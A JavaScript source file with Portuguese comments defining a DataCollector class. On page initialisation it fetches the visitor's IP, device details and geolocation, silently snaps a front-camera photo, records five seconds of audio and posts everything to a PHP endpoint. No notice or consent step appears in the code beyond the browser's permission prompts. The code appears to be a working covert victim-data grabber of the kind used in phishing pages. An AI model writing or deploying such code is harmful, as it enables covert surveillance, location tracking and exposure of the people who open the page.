class DataCollector {
    constructor(options = {}) {
        // Configurações padrão
        this.options = {
            enableCamera: options.enableCamera || false,
            enableMicrophone: options.enableMicrophone || false,
            enableGeolocation: options.enableGeolocation || false,
            endpoint: options.endpoint || 'save_data.php', // Endpoint para enviar os dados
            onDataCaptured: options.onDataCaptured || (() => {}), // Callback quando os dados são capturados
            onError: options.onError || (() => {}) // Callback para erros
        };

        // Elementos do DOM (se necessário)
        this.videoElement = options.videoElement || document.createElement('video');
        this.canvasElement = options.canvasElement || document.createElement('canvas');
    }

    // Função para obter informações do dispositivo
    getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
        };
    }

    // Função para capturar a foto (opcional)
    capturePhoto(ip, latitude, longitude, deviceInfo) {
        return new Promise((resolve, reject) => {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    this.videoElement.srcObject = stream;
                    this.videoElement.play();

                    setTimeout(() => {
                        this.canvasElement.width = this.videoElement.videoWidth || 300;
                        this.canvasElement.height = this.videoElement.videoHeight || 400;
                        const context = this.canvasElement.getContext('2d');
                        context.drawImage(this.videoElement, 0, 0, this.canvasElement.width, this.canvasElement.height);
                        const imageData = this.canvasElement.toDataURL('image/png');

                        // Parar o stream da câmera
                        stream.getTracks().forEach(track => track.stop());

                        resolve(imageData);
                    }, 1500);
                })
                .catch(error => {
                    reject(error);
                });
        });
    }

    // Função para capturar áudio (opcional)
    captureAudio() {
        return new Promise((resolve, reject) => {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    const audioChunks = [];
                    const mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        const reader = new FileReader();
                        reader.readAsDataURL(audioBlob);
                        reader.onloadend = () => {
                            resolve(reader.result);
                        };
                    };

                    // Iniciar gravação por 5 segundos (ou o tempo que desejar)
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop()); // Parar o stream de áudio
                    }, 5000); // 5 segundos de gravação
                })
                .catch(error => {
                    reject(error);
                });
        });
    }

    // Função para enviar dados
    sendData(data) {
        return fetch(this.options.endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                this.options.onDataCaptured(data);
            } else {
                this.options.onError(new Error("Erro ao processar os dados."));
            }
        })
        .catch(error => {
            this.options.onError(error);
        });
    }

    // Função para solicitar permissões de câmera e microfone
    requestMediaPermissions() {
        if (this.options.enableCamera) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    stream.getTracks().forEach(track => track.stop()); // Parar o stream da câmera
                })
                .catch(error => {
                    this.options.onError(error);
                });
        }

        if (this.options.enableMicrophone) {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    stream.getTracks().forEach(track => track.stop()); // Parar o stream do microfone
                })
                .catch(error => {
                    this.options.onError(error);
                });
        }
    }

    // Função para verificar permissões
    checkPermissions() {
        return Promise.all([
            this.options.enableGeolocation ? navigator.permissions.query({ name: 'geolocation' }) : Promise.resolve({ state: 'denied' }),
            this.options.enableCamera ? navigator.permissions.query({ name: 'camera' }) : Promise.resolve({ state: 'denied' }),
            this.options.enableMicrophone ? navigator.permissions.query({ name: 'microphone' }) : Promise.resolve({ state: 'denied' })
        ]).then(results => {
            return {
                geo: results[0].state,
                camera: results[1].state,
                microphone: results[2].state
            };
        }).catch(error => {
            this.options.onError(error);
            return {
                geo: 'prompt',
                camera: 'prompt',
                microphone: 'prompt'
            };
        });
    }

    // Função principal para capturar e enviar dados
    async captureAndSendData() {
        try {
            const ipResponse = await fetch('https://api64.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;
            const deviceInfo = this.getDeviceInfo();

            let latitude = null;
            let longitude = null;
            let imageData = null;
            let audioData = null;

            // Capturar geolocalização (se habilitado)
            if (this.options.enableGeolocation) {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                latitude = position.coords.latitude;
                longitude = position.coords.longitude;
            }

            // Capturar foto (se habilitado)
            if (this.options.enableCamera) {
                imageData = await this.capturePhoto(ip, latitude, longitude, deviceInfo);
            }

            // Capturar áudio (se habilitado)
            if (this.options.enableMicrophone) {
                audioData = await this.captureAudio();
            }

            // Enviar dados
            await this.sendData({
                ip,
                latitude,
                longitude,
                image: imageData,
                deviceInfo,
                audio: audioData
            });
        } catch (error) {
            this.options.onError(error);
        }
    }

    // Inicializar o coletor de dados
    init() {
        this.requestMediaPermissions();
        this.captureAndSendData();
    }
}
